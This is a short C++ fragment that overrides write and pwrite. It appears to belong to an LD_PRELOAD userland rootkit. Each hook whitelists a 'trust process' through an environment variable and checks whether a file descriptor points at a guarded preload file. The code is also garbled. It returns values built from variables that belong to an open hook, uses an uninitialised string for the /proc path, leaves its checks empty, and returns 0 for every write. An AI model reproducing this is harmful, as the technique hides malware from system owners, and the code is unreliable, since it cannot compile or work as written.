
#include "main.h"



ssize_t write (int fd, void *buf, size_t count) {
	istringstream issCnv;
	std::string lnkAim;
	
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return opnPtr (pathname, flags, mode);
	}
	
	issCnv << fd;
	lnkAim = readLinkName (("/proc/self/fd/" + lnkAim).c_str ());
	
	if (lnkAim == prelFileName) {
		
		
		
	}
	
	
	return 0;
}

ssize_t pwrite (int fd, const void *buf, size_t count, off_t offset) {
	istringstream issCnv;
	std::string lnkAim;
	
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return opnPtr (pathname, flags, mode);
	}
	
	issCnv << fd;
	lnkAim = readLinkName (("/proc/self/fd/" + lnkAim).c_str ());
	
	if (lnkAim == prelFileName) {
		
		
		
	}
	
	
	return 0;
}








